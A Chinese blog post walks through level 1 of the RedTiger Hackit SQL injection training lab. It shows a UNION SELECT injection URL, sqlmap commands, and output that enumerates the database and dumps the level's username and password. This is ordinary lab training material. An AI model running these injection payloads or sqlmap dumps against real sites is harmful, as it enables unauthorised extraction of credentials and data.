---
layout: post
category: "hack"
title: "RedTigers-Hackit[第一关]"
tags: ["hack"]
---

#### 1.安装扩展
- RedTigers-Hackit是一个训练SQLi（SQL注入漏洞）
- <https://redtiger.labs.overthewire.org/> 
- 闲的没事儿，搜了一下，网上有答案 
- 第一关答案:
- https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users
- 好吧，这不是我想要的结果
- 既然是sql注入用sqlmap吧，在liunx下习惯了命令行
- git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
- 直接python sqlmap.py -xxxxxx 就可以使用


#### 2.其实我就想知它怎么来的：
```
[root@localhost sqlmap-dev]# python sqlmap.py -u "https://redtiger.labs.overthewire.org/level1.php?cat=1"
```
得到如下所示，存在注入点，union注入，4列字段：

```
sqlmap identified the following injection points with a total of 60 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 9340=9340

    Type: UNION query
    Title: MySQL UNION query (75) - 4 columns
    Payload: cat=1 UNION ALL SELECT 75,75,CONCAT(0x7178767871,0x555a4759637151794e4e,0x71626b6271),75#
---
[21:59:54] [INFO] testing MySQL
[21:59:59] [INFO] confirming MySQL
[22:00:08] [INFO] the back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL >= 5.0.0
[22:00:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/redtiger.labs.overthewire.org'
```

还是猜一下库名吧：

```
[root@localhost sqlmap-dev]# python sqlmap.py -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" --current-db
```

```
[*] starting at 22:18:29

[22:18:29] [INFO] resuming back-end DBMS 'mysql'
[22:18:29] [INFO] testing connection to the target URL
[22:18:35] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 9340=9340

    Type: UNION query
    Title: MySQL UNION query (75) - 4 columns
    Payload: cat=1 UNION ALL SELECT 75,75,CONCAT(0x7178767871,0x555a4759637151794e4e,0x71626b6271),75#
---
[22:18:39] [INFO] the back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL 5
[22:18:39] [INFO] fetching current database
current database:    'hackit'
[22:18:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/redtiger.labs.overthewire.org'

```
表名页面有提示，省掉一步：
Tablename: level1_users 

猜列名：

```
[root@localhost sqlmap-dev]# python sqlmap.py -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -D "hackit" -T "level1_users" --columns
```
得到结果，其实到这里就不用再猜了，重要的两个字段出来了

```
[22:23:13] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 12
[22:23:20] [CRITICAL] maximum number of used threads is 10 avoiding potential connection issues
please enter number of threads? [Enter for 1 (current)] 10
[22:23:25] [INFO] starting 10 threads
[22:23:41] [INFO] retrieved: username
[22:23:42] [INFO] retrieved: id
[22:27:05] [INFO] retrieved: password
[22:47:24] [INFO] tried 1245/2526 items (49%)
[22:47:27] [CRITICAL] connection dropped or unknown HTTP status code received. Try to force the HTTP User-Agent header with option '--user-agent' or switch '--random-agent'. sqlmap is going to retry the request
[22:47:27] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
[22:48:14] [INFO] tried 1275/2526 items (50%)
```

看用户名和密码

```
[root@localhost sqlmap-dev]# python sqlmap.py -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -D "hackit" -T "level1_users" -C "username,password" --dump

```

两个字段内容

```
[22:52:35] [WARNING] unable to retrieve column names for table 'level1_users' in database 'hackit'
[22:52:35] [INFO] fetching entries of column(s) 'password, username' for table 'level1_users' in database 'hackit'
[22:52:44] [INFO] analyzing table dump for possible password hashes
Database: hackit
Table: level1_users
[1 entry]
+----------+-------------+
| username | password    |
+----------+-------------+
| Hornoxe  | thatwaseasy |
+----------+-------------+

```
在网站第一关输入后，过关。

>
- 请尊重本人劳动成功，可以随意转载但保留以下信息 
- 作者：岁月经年 
- 时间：2015年5月
